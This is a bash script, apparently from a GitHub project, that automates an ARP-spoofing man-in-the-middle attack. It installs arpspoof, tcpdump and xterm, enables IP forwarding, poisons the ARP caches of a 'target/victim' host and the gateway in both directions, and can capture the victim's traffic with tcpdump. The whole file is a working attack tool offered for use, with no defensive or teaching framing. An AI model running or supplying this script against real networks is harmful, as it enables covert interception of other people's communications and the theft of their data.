#!/bin/bash
echo "#############################"
echo "#            MITM       v1.0#"
echo "#                           #"
echo "# github.com/Munazirul/mitm   #"
echo "#############################"
while getopts r:t:i: flag 
do
    case "${flag}" in
        r) gateway=${OPTARG};;
        t) target=${OPTARG};;
        i) interface=${OPTARG};;
    esac
done
if [[ `command -v tcpdump` && `command -v xterm` && `command -v arpspoof` ]]; then
    echo ''
    else
        echo "Installing required packages"
        sudo apt install tcpdump -y >/dev/null 2>&1
        sudo apt install xterm -y >/dev/null 2>&1
        sudo apt install arpspoof -y >/dev/null 2>&1
        echo "Successfully Installed the packages"
        fi
function arp_spoof_nocapture(){
   sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
   sudo xterm -geometry 80x24-0+0 -e arpspoof -i $interface -t $target $gateway &
   sudo xterm -geometry 80x24-0+380 -e arpspoof -i $interface -t $gateway $target 
}
function arp_spoof_capture(){
    sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
   sudo xterm -geometry 80x24-0+0 -e arpspoof -i $interface -t $target $gateway &
   sudo xterm -geometry 80x24-0+380 -e arpspoof -i $interface -t $gateway $target &
    printf "\n\n[+]Capturing packets\n\n"
         sleep 2
         tcpdump -i $interface src $target
}

if [[ -z $gateway && -z $target && -z $interface ]]
then
    echo "Usage:" 
    echo "sudo ./mitm.sh -i [interface] -r [ip] -t [ip] -c capture"
    echo "-i  interface"
    echo "     example - wlan0 or eth0"
    echo "-r  router/gateway ip address"
    echo "-t  target/victim ip address"
    echo ''
else 
    echo -e "Do you want to capture traffic of the target machine?(y/n) :"
    read option
    if [[ $option == y ]]
    then
     arp_spoof_capture
        else 
        arp_spoof_nocapture
        fi
fi
trap "echo Exiting; sleep 2; echo Thank you for using our tool; sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1; exit" 0 2 15

